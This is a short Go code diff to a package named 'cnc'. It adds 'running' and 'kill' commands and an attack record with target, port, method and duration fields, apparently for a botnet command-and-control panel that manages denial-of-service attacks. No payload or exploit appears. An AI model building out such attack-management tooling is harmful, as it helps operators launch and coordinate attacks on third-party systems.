@@ -1,5 +1,7 @@
 package cnc
 
+import "sync"
+
 type Attribute int
 
 type CommandsInfo struct {
@@ -98,4 +100,29 @@ var CmdList = map[int]CommandsInfo{
 		Uint8:       []byte{109, 101, 116, 104, 111, 100, 115},
 		function:    Methods,
 	},
+	6: {
+		Description: "Running",
+		Name:        "running",
+		Uint8:       []byte{114, 117, 110, 110, 105, 110, 103},
+		function:    RunningCnc,
+	},
+	7: {
+		Description: "kill",
+		Name:        "kill",
+		Uint8:       []byte{107, 105, 108, 108},
+		function:    KillAttack,
+	},
 }
+
+type attackStruct struct {
+	ch       chan int
+	ID       int
+	Duration int
+	Finish   int
+	Method   string
+	Target   string
+	Login    string
+	Port     string
+}
+
+var AttackMap sync.Map
